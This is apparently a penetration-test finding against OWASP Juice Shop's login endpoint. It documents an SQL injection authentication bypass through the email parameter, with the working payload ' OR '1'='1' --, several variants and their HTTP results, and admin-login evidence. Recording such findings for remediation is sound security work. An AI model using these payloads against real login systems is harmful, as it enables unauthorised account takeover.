## SQL Injection in Login Email Parameter

**Endpoint:** POST /rest/user/login
**Parameter:** email
**Vulnerability Class:** SQL Injection (Authentication Bypass)

### Detection Payload
```json
{"email": "' OR '1'='1' -- ", "password": "anything"}
```

### Evidence
- **Normal response** (invalid credentials): HTTP 401 `{"error":"Invalid email or password."}`
- **SQLi response** (with payload): HTTP 200 with valid JWT token and admin user data:
  ```json
  {
    "authentication": {
      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
      "bid": 1,
      "umail": "admin@juice-sh.op"
    }
  }
  ```
- The payload `' OR '1'='1' --` bypassed authentication entirely, logging in as the admin user (id=1, role="admin") without knowing the password.

### Impact
Complete authentication bypass. Attacker can log in as any user, including admin, without valid credentials.

### Technical Detail
The email parameter is concatenated directly into a SQL query without parameterization. The `' OR '1'='1' --` payload terminates the email string, adds an always-true condition, and comments out the rest of the query.

### Confirmation Payloads
- `' OR '1'='1' --` → HTTP 200, admin login (confirmed)
- `' OR 1=1 -- ` → HTTP 200, admin login (confirmed)
- `" OR "1"="1` → HTTP 401 (not injectable with double-quote syntax, but single-quote works)
- `' OR '1'='1` → HTTP 401 (without comment terminator, query still fails)